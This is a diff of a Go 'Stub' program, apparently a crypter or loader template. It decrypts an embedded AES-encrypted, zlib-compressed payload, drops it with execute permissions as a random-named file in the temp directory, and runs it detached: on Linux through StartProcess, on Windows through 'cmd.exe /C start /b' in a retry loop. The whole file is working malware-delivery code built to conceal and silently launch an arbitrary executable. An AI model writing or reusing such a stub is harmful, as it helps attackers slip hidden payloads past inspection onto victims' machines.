@@ -1,29 +1,34 @@
 package main
 
 import (
+	"bytes"
+	"compress/zlib"
+	"fmt"
+	"io"
+	"io/ioutil"
 	"os"
+	"os/exec"
 	"path"
 	"path/filepath"
-	"compress/zlib"
-	"bytes"
-	"github.com/pabloskubert/Stub/pkg/aes"
+	"runtime"
 	"time"
-	"io"
+
+	"github.com/pabloskubert/Stub/pkg/aes"
 
 	uuid "github.com/hashicorp/go-uuid"
 )
 
 const (
-	AES_KEY = "<KEY>"
-	EXT     = "<EXT>"
+	AES_KEY        = "<KEY>"
+	EXT            = "<EXT>"
 	GCM_NONCE_SIZE = 12
 )
 
-var PAYLOAD = []byte{/*PAYLOAD*/}
+var PAYLOAD = []byte{ /*PAYLOAD*/ }
 
 func main() {
 	otpName, _ := uuid.GenerateUUID()
-	fullOtp := filepath.Join(os.TempDir(), otpName + EXT)
+	fullOtp := filepath.Join(os.TempDir(), otpName+EXT)
 
 	nonce := PAYLOAD[:GCM_NONCE_SIZE]
 	aes := &aes.AesCrypto{
@@ -39,38 +44,51 @@ func main() {
 		panic(err)
 	}
 
-	b := bytes.NewReader(rawPayload) 
+	b := bytes.NewReader(rawPayload)
 	r, _ := zlib.NewReader(b)
 
-	if _, err := os.Stat(fullOtp); os.IsNotExist(err) {
-		os.MkdirAll(path.Dir(fullOtp), 0755)
-		os.Create(fullOtp)
-	}
+	var uncompPayload bytes.Buffer
+	_, err = io.Copy(&uncompPayload, r)
 
-	f, err := os.OpenFile(fullOtp, os.O_WRONLY, 0644)
 	if err != nil {
-		return;
+		panic(err)
+	} else {
+		r.Close()
 	}
 
-	_, err = io.Copy(f, r)
+	err = ioutil.WriteFile(fullOtp, uncompPayload.Bytes(), 0755)
 	if err != nil {
-		return;
-	}	
-
-	r.Close()
-	f.Close()
-	proc, err := os.StartProcess(fullOtp, []string{fullOtp}, &os.ProcAttr{
-		Dir:   path.Dir(fullOtp),
-		Env: os.Environ(),
-		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
-	})
-	
-	if err != nil {
-		return
+		panic(err)
 	}
 
-	for err := proc.Release(); err != nil; {
-		time.Sleep(time.Second * 2)
-	}
+	// Detached
+	switch runtime.GOOS {
+	case "linux":
+		proc, err := os.StartProcess(fullOtp, []string{fullOtp}, &os.ProcAttr{
+			Dir:   path.Dir(fullOtp),
+			Env:   os.Environ(),
+			Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
+		})
 
+		if err != nil {
+			return
+		}
+
+		err = proc.Release()
+		if err != nil {
+			panic(err)
+		}
+	case "windows":
+		for {
+			cmd := exec.Command("cmd.exe", "/C", "start", "/b", fullOtp)
+			if err := cmd.Run(); err != nil {
+				fmt.Printf("Error running proc: %s", err)
+			} else {
+				fmt.Println("Launched!")
+				break
+			}
+
+			time.Sleep(time.Second * 15)
+		}
+	}
 }
